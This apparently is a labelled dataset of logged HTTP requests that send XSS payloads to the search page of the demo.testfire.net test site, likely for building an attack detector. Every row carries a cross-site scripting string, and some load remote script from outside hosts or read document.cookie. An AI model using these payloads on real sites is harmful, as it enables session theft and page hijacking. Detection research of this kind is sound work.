GET,http://demo.testfire.net/search.jsp?query=<SCRIPT SRC=http://ha.ckers.org/xss.js,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,305
GET,"http://demo.testfire.net/search.jsp?query=<A HREF=""http://google:ha.ckers.org"">XSS</A>","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,300
GET,"http://demo.testfire.net/search.jsp?query=<A HREF=""http://ha.ckers.org@google"">XSS</A>","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,297
GET,"http://demo.testfire.net/search.jsp?query=<A HREF=""//google"">XSS</A>","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,297
GET,http://demo.testfire.net/search.jsp?query=<IFRAME SRC=http://ha.ckers.org/scriptlet.html <,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,0,0,200,295
GET,http://demo.testfire.net/search.jsp?query=y=<a>alert</a>;content[y](123),"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,0,0,200,294
GET,"http://demo.testfire.net/search.jsp?query=sstyle=foobar""tstyle=""foobar""ystyle=""foobar""lstyle=""foobar""estyle=""foobar""=-moz-binding:url(http://h4k.in/mozxss.xml#xss)>foobar</b>#xss)"" a=""","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,282
GET,http://demo.testfire.net/search.jsp?query=with(document.__parent__)alert(1),"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,270
GET,"http://demo.testfire.net/search.jsp?query=style=-moz-binding:url(http://h4k.in/mozxss.xml#xss);"" a=""","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,280
GET,http://demo.testfire.net/search.jsp?query=<s>000<s><s>111</s><s>222</s>&#60&#115&#62&#51&#51&#51&#60&#47&#115&#62&#x3c&#x73&#x3e&#x34&#x34&#x34&#x3c&#x2f&#x73&#x3e,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,0,0,200,277
GET,"http://demo.testfire.net/search.jsp?query=';alert(0)//\';alert(1)//"";alert(2)//\"";alert(3)//--></SCRIPT>"">'><SCRIPT>alert(4)</SCRIPT>=&{}"");}alert(6);function xss(){//","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,344
GET,"http://demo.testfire.net/search.jsp?query=';alert(0)//\';alert(1)//"";alert(2)//\"";alert(3)//--></SCRIPT>"">'></title><SCRIPT>alert(4)</SCRIPT>=&{</title><script>alert(5)</script>}"");}","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,341
GET,"http://demo.testfire.net/search.jsp?query='';!--""<script>alert(0);</script>=&{(alert(1))}","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,1562
GET,http://demo.testfire.net/search.jsp?query=</title><script>alert(1)</script>,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,332
GET,http://demo.testfire.net/search.jsp?query=</textarea><br><code onmouseover=a=eval;b=alert;a(b(/g/.source));>MOVE MOUSE OVER THIS AREA</code>,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,0,0,200,303
GET,"http://demo.testfire.net/search.jsp?query='';!--""<XSS>=&{()}","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,304
GET,http://demo.testfire.net/search.jsp?query=<IMG SRC=javascript:alert('XSS')>,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,308
GET,http://demo.testfire.net/search.jsp?query=<IMG SRC=JaVaScRiPt:alert('XSS')>,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,306
GET,"http://demo.testfire.net/search.jsp?query=<IMG SRC=`javascript:alert(""XSS says, 'XSS'"")`>","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,310
GET,"http://demo.testfire.net/search.jsp?query=<IMG """"""><SCRIPT>alert(""XSS"")</SCRIPT>"">"",","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,298
GET,"http://demo.testfire.net/search.jsp?query=<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,271
GET,http://demo.testfire.net/search.jsp?query=<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,0,0,200,273
GET,http://demo.testfire.net/search.jsp?query=<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,0,0,200,271
GET,"http://demo.testfire.net/search.jsp?query=<IMG SRC=""jav&#x0D;ascript:alert('XSS');"">","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,339
GET,"http://demo.testfire.net/search.jsp?query=<IMG SRC=""jav&#x09;ascript:alert(<WBR>'XSS');"">","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,331
GET,"http://demo.testfire.net/search.jsp?query=<IMG SRC=""jav&#x0A;ascript:alert(<WBR>'XSS');"">","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,330
GET,http://demo.testfire.net/search.jsp?query=<img src=`x` onrerror= ` ;; alert(1) ` />,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,616
GET,"http://demo.testfire.net/search.jsp?query=</a style=""""xx:expr/**/ession(document.appendChild(document.createElement('script')).src='http://h4k.in/i.js')"">","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,307
GET,"http://demo.testfire.net/search.jsp?query=style=color: expression(alert(0));"" a=""","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,305
GET,http://demo.testfire.net/search.jsp?query=vbscript:Execute(MsgBox(chr(88)&chr(83)&chr(83)))<,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,0,0,200,305
GET,http://demo.testfire.net/search.jsp?query=width: expression((window.r==document.cookie)?'':alert(r=document.cookie)),"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,308
GET,http://demo.testfire.net/search.jsp?query=<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,306
GET,"http://demo.testfire.net/search.jsp?query=<DIV STYLE=""width: expression(alert('XSS'));"">","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,305
GET,"http://demo.testfire.net/search.jsp?query=<IMG SRC=""jav&#x0A;ascript:alert('XSS');"">","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,305
GET,"http://demo.testfire.net/search.jsp?query=<IMG SRC=""javascript:alert('XSS');"">","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,318
GET,"http://demo.testfire.net/search.jsp?query=<FRAMESET><FRAME SRC=""javascript:alert('XSS');""></FRAMESET>","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,200,302
